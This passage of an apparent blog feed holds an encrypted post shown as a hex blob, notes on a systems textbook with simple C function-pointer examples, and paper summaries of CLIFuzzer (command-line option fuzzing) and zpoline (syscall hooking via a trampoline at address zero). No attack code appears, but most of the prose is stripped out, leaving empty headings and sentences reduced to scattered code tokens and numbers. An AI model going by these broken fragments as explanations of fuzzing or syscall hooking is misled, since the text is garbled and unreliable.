60f242fa6ee960e9d1bb95f8eeb4c3ed2566ce1d923356a17338a23a137f4c3e83c1c894bd8f2372365c901e7fcb7fc6b9f6be06dd02be9717549e3555e1ac7f6dbf7e89d42ed6c0b026aacb982cbca065eb3fb780ee8d6f7c4381c8dbe03b3508d522668c3f354a74cc992ca5cf2cce56fbf630a3704eb16cbdc3f992a4b44b14212c0512d24fb9ec0eee14cd796ee6f058000223bd1cc072c8b5edbdcfeb51d86da5b187c9b17b60e746b7326aeb79a2e53b5e96c461dd1fd63f892419170464343b32cd5f621c7dfdc33f66dce37d0d896aa2c43f442ef018337e2e7375191bc7db133964d2e4c376353a67e63831c493e83ad2ce79c1096c6ac10c0571782b126f978385b661eb5d8e5a6ffbfcaf00a76cc3f2e10193ee3c065382fe2098cecab5c623b597de6f98eeb5148b6dab75ed9b2b4b88d37bab6f10db4f450bd12f26477524f38418f19281cfe91297f2ce9019f85838e55c8a9be1d6883ec41dd628866e4ddf2906f511fdf96f1873dd6a7c53a08f0492b8cf209b4739f8376cf0f45481277e0d71757455668a4ca57150357247df7ab11ca5c842452d2697591f2d8d1a134f7221914c0865d24de379422aa9644d6d9e819e8c284d16d40b081f2467aaf76e269d6f4f1def2e830027e6847c4eca9339f7c7ee528f7698babb3311159405d6449c2688a80ea0adb12a8d712bcbad1a5d17776009fa85dca7d4811147d0d8b9b6838aa19e4ba9fea0a004a9f0dff1dbd50246b17c2142d2752149b244efc83ff1af5cfbcfe19b3f1d938a4d30e6c93e5fe30c1f520f56bef030661cc23e4e22337ff1988814df7535259abbeb2f0df7133f9aca1f8d5ae93e7a1abbeb52c82103b0c43ace7d24738bcb1563b72712868008920e2f2ec108e5721fa93ec09e4270e84456a3b4a5acf57a220f1f8e9fd426b0552333970e451984d7bb5da1c013ee704dbc774b69abebdc8eeae5dc3165e79e1f49d98b50f356a86a7308a14ba679368148477fb2474d89b81d0cb70b82fe42c71c390709bfd492e3e33b0fbafeaa192d8881d2637bf498fbf3e4c017c667994d8d15003dcb211676809113c867e9f515eb8fbfcee943ea8f6a398eebc34fadec4a8aec74a4a1f114caccba394ea53b51f775ba038b4ca03f9fa3686204909e94145c21f65b5dea90e59a50b9b21ec8aafaea728a246ac6c4d04aba43df02e8bf36cc48d40422b05af470a05debbe112db6e892e52eb017384f6e0d206b21f881a9190184e7604ec747809b3b1c7683cf241bcbcc7e1f22e3e25f2a88e48fbc1e173898e4d1c36f49c52fb594326dae9f107769da6e19814571ba1dea184393cc189477af3a8a01354be23ef61719f558c5970a6805e8ef348189533dcb6f162e6f134d8e7932af26706e35aaf381df961610be2c5f7d2fac2d0d1d87ea5145f92ba136033b960e416ca4f39cd85aafe32a77f50fc422326f3be4ffed2d1d706a2fcff9694c03a5955303edbc2d2d2ce24ce85c8bc9f9dde7feeffd7796ceef9b9601367acecd381791acbcd6067a137a332616231141f5984a073efbbc791c11a2dd74bee538cfabe2b55e2538c08ba923bc3017efd41e350e74a4497e8dbf07bcf8f8169e7864b4ac7150653040f132bec3dbe123317a9544248c8c3b9a883de31dc4d854f616ebb85664b2f0ddb8d6eb041a61018d8c1f7538138b93bbeeb9b6e61d51a361b9bf06ee8eab47d98f4423de704c5c1ec351f45ff0510dfd04f0ad7da2ecb3af44af68a5e068b247570cc6f6a2c699065b879b6b3ff19de62e2ef11f1b31e972be9d811aedfb2beb880e631f80b02dc79c616cb6be10c315a0c4cf54dda25b19b62f5c471f1e1f07ece59c9ba135ea197a2d622438183c9403bc1e431e205511e4359414b9a82a4aaf8cee4b6431a5076a792817e32b512ccbc7d959ae2defa81063b6df9a215ca3f7cb172dbe64a8d19cfa52f822e446e26017e5212c5f155d6d770f7b90c944cf14b4b34f6510624e806210596cb977c9a4435cf353ae380f55ecc33cc20af90eab4a9c61d71384e493a481cfaa5010ef2cd4d93800e6c00bc435fe75ab8d259db104903a96760bc09c5c3fce624f33e655726f1050e0ffa784268a9ab750814d0a332114bc012305bf61d5b131dd34cf9b00bf7e4a6100890d741d1890a21991225f06eec5e5ecc70fcc5eaef0eb19e47e2b86ad8b6df50565b255aa19b8d8a3e236b123ebdd6a6ce79a13bc427977fb0e60f599473ccb40a6c30b552d1013e1a5022151db49c5abb5c71610ad334259883b7f56eaf690a616cfac3cd5fb5fcbcb1701e75dc31c45bb5e7fd240185cef7cee23240592ac5057020656837394c0e0a644930c45ab21340dce8c8da479eef26eca39b55894076acb242093fe07e595167f325b5bcd737c688b9a49b9674caab7e55c575ae54d34312feab0c081fccf11faa28f2e23dd763326591de830dcb977d7ece4ceca32a1eb15d9838cd834984328a08a8ebf00469d655ab4078c8605b66a3b7fc6595e7266d17a388bb046b6f0c3faadb2c0ab14d211f2dc40faed930312a3fd22e6c276f29c72f92e91365331f6876b5fd83ca598cd50f22cb2407bf53e1b6076c02549e5c73e771061cec80bdb4d553dd6fe4bfc427dfcef7aaf7ffa7cc77a501d3e5cb375d7c57d4f1efbc50bbbb0a8da1e7e7cffe13faf9fc9a1c700b7f3df349cac5e869fe4544386f41bb27981d5e1965c44542ec96ccbbb55b1dd54c10a4e93b7fdcfee28adebafce86df6ec49171d13112f4cc9ee789cab4c8877c8211b468357307d40312cafa738567db71a16f79b24d00ac268ce5c0b3b19d411a8f784d03284365068991729765ad4340f87d8c5721b49aa9136f7abd4df6668db9d20650bf75737d81ee3637d8897721037fdd7725450ad5d0da139b980d128496a311260ac5041aba8e2984bda811f6b6282c9c9b86a64ba364fad01ed9e6a17241d3c2755226f7cf6460860a6f4a53abeade6c002a516edf4a19ec4d74b5bfbe15959c625521857e93bec90d228e36db3afb20ab7a4c6217f76e0dbfd0a6a2b9e596c4df66a77b794d842b221a69111f9adf3d648f6ba47a182729a67cd20670981ff85129f406d17840dd4d89608009fe45a6ea776ac91ec84a1900774c2c42c4eeec2514231b3090267c5c40389ee93e1d777edc4d691155dc963a33da7b3a5a58f8d9f3b61cc6cd2587c6ccbe4e7dd413bfeb13a65ca46d9dd28e4a0fc7517fc977407956819ee38b9baa700b297fa8b476f388bf6ee0f46c7ea15be46714b833ecb4246867115b92a3d2ebc4c501b4e0cf281be502c90570cfd01f97a488e8d433a80914762a723a297fb7e0dd090c6af585f7468a6b86341072c31fd9208dcb91d14f0fb48d0c363fde12cd32005056c33adb5667456a95663632eca91a4a9ea167e6d9a8672c33172e5ec455946ecd9f8a49a377646168539e3de3f265171f771c357614c417c40206d16cadeb75064de5ac36c82f828581fb016987057fc552e275201d09331c135e9b951c743d49514725b661f326b123cc10c1ebf485321972f7ccc982b42982286157d32c4e4dda1bcb6e7753de1ac342530e93dbbced1c62f00ee0ea135edd2057d293eac6c0d1e879a519ac2374c59d995718b6afa8d7120f867587c7ee049fbacb735582d84bf31c7945d121245c554139d19274ad6f952197e983e06e1d5efc24eb2d301ad75f93f72918d7d47254cdce171e45110ae11e4a56fd06cae6eb91e71b3710730ab9b23e8179ed4d089de61e5051f59ba8176c43508e9b456cd2d00c9cef6a91f5161d3384d673f183790a05f92e323c4f298b1b59652354a61a4dbe2e0fe910a24165865c0d47e513fa4b343aef6240ef9e31d928eff3346d74fc08971a5ba0d3834ba89c1643db1b863c69743f17ac58452864aed4be813cd342020bcb647856a3e2b5350d3816525a7b0c6e7064172400be5d26b1f0823988f923129b5902b825b9fd5c1576c5965f6fb24a7d3abe70dde6270dab2d4ca2ec9f3ecc665fcf10adc1efa752364314604815774911f113b8310973e24b5f058454f4a0becf2e319ab7b97a972f144114a2021a9b9a1c57e67cb6f1d55da771074df9e268280be5d62af6760093a396eee22dbb484b66085aad8135eeeda7ecbfa668439d0c2ffaf637200e3305bea94a020dd460f0cf304b42e7d5609b7e7c30e3ffe620070e54573e84f924d6d62cbb5d671c4a7b914f68605a0be1378efe10d10ec2fdf5003ab26849cbe43ce6b2f13388e584671d61ccc5d4493f03c724aafeb0c9207c0d554801c320a6b2be224431f71389a53aec340dad15c0ae41d91aa71d599e3e2771cb6f99b8dcc7d753b5e5ab1a18bf28720c475a2d0de2f97016db3fb945ce9ff144f7a222497ef807516df65f35a12e8c3893f23adae6ad1255274afbb38d31adcaedfb9624b379fbce24b9d4084176b536188fe303ab7ee46761f0107f6640813248bc3ef6d8aaa68beae9afee2165506ca3aa08da404a2671122230499b29ab52c35852a769df283f2ed2598aed4638af0c701576d0d82dda784fa21a660e3acfc71b42564d1f65f474d7e19d250d8bfe4a116129ba78af4bfa01cd56ce9588797da57d559f5490f67c02d69b5a6359861fc6b75f143d6fd13e3675b9a7f5021d49bb601c8f782863b1eb3661c5aea788308c045d2e1d79344a0f8c66173f149ab4144e67689d810f7b9428c61efa76fb1b33c6a424c7ec82cd4dbe410fda5c16ec9791b2ab0d50c8477c06d3064428a22f6ea91978d098251de70e8dd651e391e610a42baa5ee1d124bc3121da48b23d718119f82a5bc7ae83bcfd298f975e1705da37013ffbe4c1e34bc218979298d9771dba63d429bba06921fdd032bf35dfb81958e014e9b81f5ba4d5e7f2da7f3ac43bcdf124c8f347a7ed1e81fd64be0d291acad14e0e9effac799590232c7e1ce4808fed21d5f6c2d8c90d7a7fbc35b78438a1f12ff0b8245330071765d4e07fca3c802411d5ba6644b21b3e0c37ec2ad1f863844e6d4ef83dd10dde0b685e69a16e5d6819cb636d19ebbeaaf3051fdaa23f1fb04d588b7ebb710b3f086353b0e78a39c058d5fda10a73f077dff7b63e2530be6c9006171ce300b8266de4acb49e442c9109cf6e21443d262688dec60b1e1f8ceb320fdc4af2a316b8714d89a7e91e328b5ffb27372b7b51b44f8e5e0d7f37720c055441afd8b21dc3fe77e5d9cc8a4a120caabae7b23c0771ac5fefe6d219c5135d5d55fd030931039863c06dc216ef0cd7b9b5a902cf44398f93ac34c7f2ddce5f0ec2f0c84d51aba4fed52a694aba9e415d5a522286eb4afb983125adf900313be5a76e4b09ff0de1d040f634653cf1e645a56cae63e2829437ff62aa1695683d76f1990991cfdd494064088374fd87dc5e4607fdba601d7a92fe40c0714a9e351abb5dee63e36202a88024ca4b0eb49226c25027cf1351e0a0d53e4197309d2ac1a31429d679fbb5ed117ceab9d4e88f55bf93f1bb33e4aba4dc788fcec79354ba22e02e145a9170ca6e3f69f707936fca7b60fc83568a9bb7fb5420bc58fbac9133a36e5037069bba92d70a3f4078c0d3b5e8c4580c0ff214e2421963b65a2787acccb401bb5280b4b449ac9aaf84b9ea8c53104e9ceae1a6e543406ac6be462f5940d250a2f767efc621dcea2387d8d72645abbc46592ead88a33d7cb33f01fceacbd21b954ee2a9a33b950d0b2d890dafad9a5fafe5c7c06f019a7d3343be32e381cb8b127d9543d57babbd9189235869a1ab89eeff3196191c781c2ad05ec61435d2fa1ddd91935c83b615880399ee34f228a321dba4dbc2ce60cec14d5b9db236558ff66c50919e9c59ab89eee04263897dc71876da0938ef1732fc8c63c10fd58d60d9b83a732be24d3bacbec0fbb7364eeba928a66d18450699428db149ea3f4663009d15123658a44624483999c9fa9ca0279c835f93e27b5883eafba0db8aa976798eff4f64ccd251898fefe659d6a134cabf764026e3b6588af64a1ed61be8d2b1caa8a160140686feb239589bb762d983fa3835af55bd8816ef99fe70e7ae4634f766e9e02e093b50087df67265111b3f4bd50428d0fe8a9ed042e8157d8b15394691d3d36b64b98192f8ebad32e6622e7f5601a489cc144d15d5363baa6caf1a32bf01558ecd94c9832a88705434d72b02fda87d9effa59132e6d859adac799474c822a8d6b2ec74843e6c706</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="" scheme="https://wd-2711.tech/categories/%E6%9D%82%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>Computer-Science-from-the-Bottom-Up-Note-1</title>
    <link href="https://wd-2711.tech/2023/09/14/Computer-Science-from-the-Bottom-Up-Note-1/"/>
    <id>https://wd-2711.tech/2023/09/14/Computer-Science-from-the-Bottom-Up-Note-1/</id>
    <published>2023-09-14T15:25:40.000Z</published>
    <updated>2023-10-13T09:49:46.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Computer-Science-from-the-Bottom-Up-Notes-1"><a href="#Computer-Science-from-the-Bottom-Up-Notes-1" class="headerlink" title="Computer Science from the Bottom Up Notes-1"></a>Computer Science from the Bottom Up Notes-1</h1><p>&emsp;<a href="https://bottomupcs.com/index.html"></a></p><span id="more"></span><h2 id="General-Unix-and-Advanced-C"><a href="#General-Unix-and-Advanced-C" class="headerlink" title="General Unix and Advanced C"></a>General Unix and Advanced C</h2><p>&emsp;Linux  BSD  UNIX </p><h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p>&emsp;Linux</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  API */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">greet_api</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">int</span> (*say_hello)(<span class="type">char</span> *name);</span><br><span class="line"><span class="built_in">int</span> (*say_goodbye)(<span class="type">void</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">say_hello_fn</span><span class="params">(<span class="type">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, name);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">say_goodbye_fn</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Goodbye\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  API  */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">greet_api</span> greet_api =</span><br><span class="line">&#123;</span><br><span class="line">.say_hello = say_hello_fn,</span><br><span class="line">.say_goodbye = say_goodbye_fn</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">greet_api.<span class="built_in">say_hello</span>(argv[<span class="number">1</span>]);</span><br><span class="line">greet_api.<span class="built_in">say_goodbye</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p, %p, %p\n&quot;</span>, greet_api.say_hello, say_hello_fn, &amp;say_hello_fn);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;virtio.h</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">virtio_driver</span> &#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">device_driver</span> driver;</span><br><span class="line">        <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">virtio_device_id</span> *id_table;</span><br><span class="line">        <span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> *feature_table;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> feature_table_size;</span><br><span class="line">        <span class="built_in">int</span> (*probe)(<span class="keyword">struct</span> virtio_device *dev);</span><br><span class="line">        <span class="built_in">void</span> (*scan)(<span class="keyword">struct</span> virtio_device *dev);</span><br><span class="line">        <span class="built_in">void</span> (*remove)(<span class="keyword">struct</span> virtio_device *dev);</span><br><span class="line">        <span class="built_in">void</span> (*config_changed)(<span class="keyword">struct</span> virtio_device *dev);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PM</span></span><br><span class="line">        <span class="built_in">int</span> (*freeze)(<span class="keyword">struct</span> virtio_device *dev);</span><br><span class="line">        <span class="built_in">int</span> (*restore)(<span class="keyword">struct</span> virtio_device *dev);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>&emsp;greet_api<strong>UNIXlibcread()write()printf()APIPOSIX</strong></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>&emsp;</p><p><img src="/images/Computer-Science-from-the-Bottom-Up-Note-1/image-20231013134721266.png" alt="image-20231013134721266" style="zoom:67%;" /></p><p>&emsp;open API<code></code><code></code><code></code>open<code></code><code></code><code>read write</code></p><p><img src="/images/Computer-Science-from-the-Bottom-Up-Note-1/image-20231013135901371.png" alt="image-20231013135901371" style="zoom:67%;" /></p><p>&emsp;<code></code><code>/dev</code><code>/dev/null</code><code>/dev/zero</code><code>/dev/tty</code></p><p>&emsp;</p><p>&emsp;<code>API</code></p><p>&emsp;shellbashzshcshshell</p><p><img src="/images/Computer-Science-from-the-Bottom-Up-Note-1/image-20231013174154191.png" alt="image-20231013174154191" style="zoom:67%;" /></p><p>&emsp;<code>ls|more</code></p><h2 id="Binary-and-Number-Representation"><a href="#Binary-and-Number-Representation" class="headerlink" title="Binary and Number Representation"></a>Binary and Number Representation</h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Computer-Science-from-the-Bottom-Up-Notes-1&quot;&gt;&lt;a href=&quot;#Computer-Science-from-the-Bottom-Up-Notes-1&quot; class=&quot;headerlink&quot; title=&quot;Computer Science from the Bottom Up Notes-1&quot;&gt;&lt;/a&gt;Computer Science from the Bottom Up Notes-1&lt;/h1&gt;&lt;p&gt;&amp;emsp;&lt;a href=&quot;https://bottomupcs.com/index.html&quot;&gt;&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="cs-books" scheme="https://wd-2711.tech/categories/cs-books/"/>
    
    
  </entry>
  
  <entry>
    <title>CLIFuzzer</title>
    <link href="https://wd-2711.tech/2023/09/14/CLIFuzzer/"/>
    <id>https://wd-2711.tech/2023/09/14/CLIFuzzer/</id>
    <published>2023-09-14T02:32:24.000Z</published>
    <updated>2023-09-14T15:16:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CLIFuzzer"><a href="#CLIFuzzer" class="headerlink" title="CLIFuzzer"></a>CLIFuzzer</h1><p>&emsp;CLIFuzzer</p><span id="more"></span><p>&emsp;fuzzer</p><p>&emsp;<code>$&lt;&gt; &lt;parameter&gt;*</code><code>&lt;parameter&gt;</code><code>-v|-a</code><code>1.txt</code><strong></strong><code>--help</code><code>--help</code></p><p>&emsp;CLIFuzzer<code>getopt()</code>parserpythonargparseC<code>getopt()</code>fuzzer<code>getopt()</code><code>runtime library function</code>CLIFuzzer<code>ls</code></p><p><img src="/images/CLIFuzzer/image-20230914110731000.png" alt="image-20230914110731000" style="zoom:67%;" /></p><p>&emsp;CLIFuzzer</p><h2 id="getopt-"><a href="#getopt-" class="headerlink" title="getopt()"></a><code>getopt()</code></h2><p>&emsp;Cparse<code>getopt | getopt_long | getopt_long_only</code></p><p>1<code>optstring</code><code>-a</code><code>optstring=&quot;1ac:d::&quot;</code><a href="https://www.cnblogs.com/yhjoker/p/13873739.html"></a>3ab<code>:</code>c<code>::</code><code>&lt;prefix&gt;</code></p><p><img src="/images/CLIFuzzer/image-20230914113111507.png" alt="image-20230914113111507" style="zoom:67%;" /></p><p>2<code>longopts</code></p><p><img src="/images/CLIFuzzer/image-20230914121158381.png" alt="image-20230914121158381" style="zoom:67%;" /></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>&emsp;123</p><h3 id="optstringlongopts"><a href="#optstringlongopts" class="headerlink" title="optstringlongopts"></a>optstringlongopts</h3><p>&emsp;<code>getopt</code><code>getopt</code><code>LD_PRELOAD</code></p><p>&emsp;CLIFuzzer<code>optstring</code></p><p><img src="/images/CLIFuzzer/image-20230914123616739.png" alt="image-20230914123616739" style="zoom:67%;" /></p><p>&emsp;<code>optstring</code><code>&#39;-&#39;</code> 2 <code>-&lt;letter&gt;</code><code>optstring</code><code>:</code><code>+</code><a href="https://www.cnblogs.com/yhjoker/p/13873739.html"></a><code>longopts</code>parse</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>&emsp;CLIFuzzer<code>libc</code><code>libc</code>CLIFuzzer<code>open|stat</code><code>atoi|strtol</code><code>atof|strtod</code></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>&emsp;<strong></strong></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>&emsp;271wAFL++CLIFuzzerAFL++AFL++CLIFuzzerAFL++CLIFuzzercolcrashAFL++</p><p>&emsp;fuzzer</p><p>&emsp;CLIFuzzer</p><p>1<code>bison</code><code>bison --trace s1</code><code>--trace</code></p><p>2<code>tac</code><code>tac --separator=.+5 --regex E.coli</code><code>regexec.c</code><code>csplit|expr|nl</code></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>&emsp;AFLAmerical Fuzzy Lop<code>stdin</code><code>AFLGo|AFL++</code></p><p>&emsp;<code>AFL++</code><strong>fuzz</strong><code>RIDDLE</code><strong></strong>fuzzCLIFuzzeriFUZZ<code>getopt()</code><code>optstring</code>WangCLI<strong></strong>ProtobuffuzzLeeCLIFuzzer</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><a href="https://github.com/vrthra/fse2022-clifuzzer">https://github.com/vrthra/fse2022-clifuzzer</a></p><p>To be continued</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;CLIFuzzer&quot;&gt;&lt;a href=&quot;#CLIFuzzer&quot; class=&quot;headerlink&quot; title=&quot;CLIFuzzer&quot;&gt;&lt;/a&gt;CLIFuzzer&lt;/h1&gt;&lt;p&gt;&amp;emsp;CLIFuzzer&lt;/p&gt;</summary>
    
    
    
    <category term="papers" scheme="https://wd-2711.tech/categories/papers/"/>
    
    
  </entry>
  
  <entry>
    <title>zpoline</title>
    <link href="https://wd-2711.tech/2023/09/07/zpoline/"/>
    <id>https://wd-2711.tech/2023/09/07/zpoline/</id>
    <published>2023-09-07T00:41:41.000Z</published>
    <updated>2023-09-14T02:21:10.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="zpoline"><a href="#zpoline" class="headerlink" title="zpoline"></a>zpoline</h1><p>&emsp;exhaustive hooking</p><span id="more"></span><p>&emsp;<strong> <code>jmp/call</code>  <code>syscall/sysenter</code>  <code>syscall</code>  <code>sysenter</code> </strong></p><p>&emsp;zpoline <code>callq *%rax</code>  <code>syscall/sysenter</code> 0  Trampoline zpoline  <code>28.1~761.0</code>  zpoline  Redis  <code>5.2%</code> <code>72.3%~98.8%</code> </p><p>&emsp;traceOS<code>kernel-bypass frameworks</code>OS<code>legacy software artifacts</code>OS</p><p>&emsp;</p><ul><li>OS</li><li><code>exhaustive hooking</code></li></ul><p>&emsp;</p><p>1<code>Syscall User Dispatch (SUD)</code><code>int3</code></p><p>2<code>instruction punning</code><code>E9Patch</code><code>LD_PRELOAD</code><code></code></p><p>3<code>Detours</code></p><p>4<code>Dune</code></p><p>5<code>Unikernel</code></p><p>6<code>libc</code>OS</p><p>7<code>BPF/eBPF</code></p><p>&emsp;</p><ul><li><code>syscall</code>  <code>sysenter</code>  <code>0x0f 0x05</code>  <code>0x0f 0x34</code></li><li><code>syscall/sysenter</code>0 1 2 <code>rax</code><code>rax</code></li></ul><h2 id="0x00-"><a href="#0x00-" class="headerlink" title="0x00 "></a>0x00 </h2><p>&emsp;<code>syscall/sysenter</code><code>callq *%rax(0xff 0xd0)</code><code>*</code><code>%rax</code><code>callq *%rax</code>1<code>rax</code><code>0-&gt;500</code></p><p>&emsp;<strong>zpoline  0  Trampoline 0<code>nop</code><code>nop</code></strong></p><p>&emsp;trampoline<code>callq *%rax</code>trampoline<code>nop</code><code>nop</code><code>nop</code><code>callq *%rax</code></p><p><img src="/images/zpoline/image-20230908112203755.png" alt="image-20230908112203755" style="zoom:67%;" /></p><p>&emsp;zpoline zpoline<code>seccomp</code> zpoline  CPU MPK</p><h2 id="0x01-"><a href="#0x01-" class="headerlink" title="0x01 "></a>0x01 </h2><p>1<code>mmap</code>0root0<code>/proc/sys/vm/mmap_min_addr</code>0root0<code>0-500</code><code>nop</code></p><p>2<code>`syscall/sysenter</code><code>callq *%rax(0xff 0xd0)</code></p><p>&emsp;<code>libzpoline.so</code></p><h2 id="0x02-"><a href="#0x02-" class="headerlink" title="0x02 "></a>0x02 </h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>&emsp;<code>libzpoline.so</code><code>syscall/sysenter</code><code>dlmopen</code><code>dlopen</code><code>dlopen</code><code>dlmopen</code></p><p>&emsp;<code>dlmopen</code><code>libzpoline.so</code><code>dlmopen</code><code>libzpoline.so</code><code>dlsym</code><code>libzpoline.so</code></p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>&emsp;0nullnullnullnull</p><p>1nullzpolinetrampoline<code>eXecute-Only Memory (XOM)</code>XOM</p><p>&emsp;MPKCPULinux<code>mprotect</code><code>PROT_EXEC</code>XOM</p><p>2nullzpoline<code>syscall/sysenter</code><code>syscall/sysenter</code>nullnullbitmap</p><h2 id="0x03-"><a href="#0x03-" class="headerlink" title="0x03 "></a>0x03 </h2><p>1<code>libzpoline.so</code><code>syscall/sysenter</code><code>X-Containers</code></p><p>2vDSOzpolinevDSOvDSO</p><p>30zpoline00</p><p>4windowszpoline<code>0x10000</code>windowslinux<code>Windows Subsustem for Linux(WSL)</code>zpolineWSL2macoszpoline0<code>__PAGEZERO</code></p><p>5CPUzpolineCPUarmzpoline<code>0-500</code></p><h2 id="0x04-"><a href="#0x04-" class="headerlink" title="0x04 "></a>0x04 </h2><h3 id="ptrace"><a href="#ptrace" class="headerlink" title="ptrace"></a>ptrace</h3><p>&emsp;UNIX<code>ptrace</code><code></code></p><h3 id="int3-"><a href="#int3-" class="headerlink" title="int3 "></a>int3 </h3><p>&emsp;int3 int3 <code>SIGTRAP</code>int3<code>syscall/sysenter</code><code>SIGTRAP</code>handler</p><h3 id="Syscall-User-Dispatch-SUD"><a href="#Syscall-User-Dispatch-SUD" class="headerlink" title="Syscall User Dispatch(SUD)"></a>Syscall User Dispatch(SUD)</h3><p>&emsp;linuxwindowsring3<strong>SUD<code>SIGSYS</code><code>SIGSYS</code>handlerint3</strong>handler</p><h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p>&emsp;<code>ld.so</code><code>LD_PRELOAD</code>main</p><p>&emsp;<code>syscall/sysenter</code><code>glibc</code><code></code>OSOSOS</p><h2 id="0x05--"><a href="#0x05--" class="headerlink" title="0x05 +"></a>0x05 +</h2><p><a href="https://github.com/WD-2711/zpoline">https://github.com/WD-2711/zpoline</a></p><p>Done!</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;zpoline&quot;&gt;&lt;a href=&quot;#zpoline&quot; class=&quot;headerlink&quot; title=&quot;zpoline&quot;&gt;&lt;/a&gt;zpoline&lt;/h1&gt;&lt;p&gt;&amp;emsp;exhaustive hooking&lt;/p&gt;</summary>
    
    
    
    <category term="papers" scheme="https://wd-2711.tech/categories/papers/"/>
    
    
  </entry>
  
  <entry>
    <title>KCTF-2023</title>
    <link href="https://wd-2711.tech/2023/09/06/KCTF-2023/"/>
    <id>https://wd-2711.tech/2023/09/06/KCTF-2023/</id>
    <published>2023-09-06T13:20:56.000Z</published>
    <updated>2023-09-22T17:17:58.000Z</updated>
    
